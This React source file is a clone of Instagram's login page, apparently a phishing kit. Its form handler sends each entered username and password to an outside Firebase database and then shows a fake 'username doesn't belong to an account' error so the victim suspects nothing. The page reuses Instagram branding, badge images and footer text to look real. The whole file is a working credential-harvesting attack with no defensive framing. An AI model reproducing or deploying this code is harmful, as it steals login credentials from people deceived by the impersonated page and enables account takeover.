import React, {useState} from "react";
import axios from "axios";
import Carusel from "./componets/carusel";

function App() {

  const [login, setLogin] = useState('');
  const [password, setPassword] = useState('');
  const [invalid, setInvalid] = useState('');

  const submitHandler = (e) => {
    e.preventDefault();

    const postData = {
      login,
      password
    }

    axios.post('https://instagramfriends-a66ca-default-rtdb.firebaseio.com/manKeldm.json', postData)
        .then(res => {
          console.log(res)
          setInvalid('The username you entered doesn\'t belong to an account. Please check your username and try again.')
        });

    setLogin('');
    setPassword('');
  }

  return (
    <div className="App">

      <div id="wrapper">
        <div className="container">
          <div className="phone">
            <Carusel />
          </div>
          <div className="form-data">
            <form onSubmit={submitHandler}>
              <div className="logo">
                <div className="heading"></div>
              </div>

                  <input type="text" value={login} onChange={(e) => setLogin(e. target.value)} placeholder="Phone number, username, or email" />

                  <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Password" />

                  <button className="form-btn" type="submit">Log in</button>

                  <span className="has-separator">Or</span>

                  <a href="#" className="facebook-login">
                    <i className="fab fa-facebook"></i> Log in with Facebook
                  </a>

                  <h2 className="invalid">{invalid}</h2>

                  <a className="password-reset" href="#">Forgot password?</a>
            </form>
            <div className="sign-up">
              Don't an account? <a href="#">Sign up</a>
            </div>
            <div className="get-the-app">
              <div className="spanchik">Get the app.</div>
              <div className="badge">
                <img
                    src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png"
                    alt="android App" />
                  <img
                      src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png"
                      alt="ios app" />
              </div>
            </div>
          </div>
        </div>

        <footer>
          <div className="container">
            <nav className="footer-nav">
              <ul>
                <li><a className="footerLink" href="#">About Us</a></li>
                <li><a className="footerLink" href="#">Support</a></li>
                <li><a className="footerLink" href="#">Jobs</a></li>
                <li><a className="footerLink" href="#">Privacy</a></li>
                <li><a className="footerLink" href="#">Terms</a></li>
                <li><a className="footerLink" href="#">Profiles</a></li>
                <li><a className="footerLink" href="#">Languages</a></li>
                <li><a className="footerLink" href="#">Languages</a></li>
                <li><a className="footerLink" href="#">Languages</a></li>
                <li><a className="footerLink" href="#">Languages</a></li>
              </ul>
              <ul className="ul-2">
                <li><a className="footerLink" href="#">About Us</a></li>
                <li><a className="footerLink" href="#">Support</a></li>
                <li><a className="footerLink" href="#">Jobs</a></li>
                <li><a className="footerLink" href="#">Privacy</a></li>
                <li><a className="footerLink" href="#">Terms</a></li>
                <li><a className="footerLink" href="#">Profiles</a></li>
                <li><a className="footerLink" href="#">Languages</a></li>
              </ul>
              <div className="copyright-notice">
                © 2021 Instagram from Facebook
              </div>
            </nav>
          </div>
        </footer>
      </div>

    </div>
  );
}

export default App;
